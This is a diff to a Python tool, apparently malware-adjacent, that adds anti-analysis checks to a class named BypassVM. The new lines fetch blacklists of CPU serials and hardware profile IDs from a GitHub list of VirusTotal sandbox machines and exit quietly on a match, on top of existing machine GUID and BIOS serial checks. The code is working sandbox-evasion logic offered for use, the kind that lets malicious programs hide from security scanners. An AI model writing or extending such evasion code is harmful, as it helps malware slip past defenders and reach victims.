@@ -1,6 +1,6 @@
 # -* kerpy tool by Lawxsz on github and telegram!! -* #
 
-import re, uuid, wmi, requests, os, ctypes, sys, subprocess, socket
+import re, uuid, wmi, requests, os, ctypes, sys, subprocess, socket, platform
 
 def get_base_prefix_compat(): # define all of the checks
     return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
@@ -94,6 +94,15 @@ class BypassVM:
      if machine_guid in guid_pc:
          sys.exit()
      w = wmi.WMI()
+     serial_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt").text
+     serial_ = platform.processor()
+     if serial_ in serial_list:
+            sys.exit()
+     for profile in w.Win32_ComputerSystem():
+      hw_profile_guid = profile.Model
+     hwprid = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt").text
+     if hw_profile_guid in hwprid:
+            sys.exit()
      for bios in w.Win32_BIOS():
       bios_check = bios.SerialNumber    
      if bios_check in bios_guid:
